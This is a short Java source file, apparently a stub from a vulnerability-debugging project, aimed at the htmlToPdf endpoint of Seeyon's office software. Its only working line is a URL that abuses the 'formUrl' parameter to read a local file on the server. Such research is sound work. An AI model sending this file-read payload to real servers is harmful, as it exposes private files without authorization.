package cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import com.seeyon.ctp.common.htmltopdf.controller.HtmlToPdfController;
import com.seeyon.ctp.common.htmltopdf.manager.impl.HtmlToPdfManagerImpl;
import com.seeyon.ctp.common.office.HtmlOfficeServlet;
import com.seeyon.ctp.common.office.OfficeServlet;
import com.seeyon.ctp.common.web.filter.CTPSecurityFilter;
import com.seeyon.ctp.portal.controller.PortalController;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;
import org.springframework.web.context.support.CTPWebApplicationContext;
import org.springframework.web.servlet.CTPDispatcherServlet;

import java.io.IOException;
import java.nio.charset.StandardCharsets;

public class htmlToPdf_fileread {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201/seeyon/htmlToPdf/htmlToPdf.do?method=htmlToPdf&formUrl=C:/test.txt";


    }
}
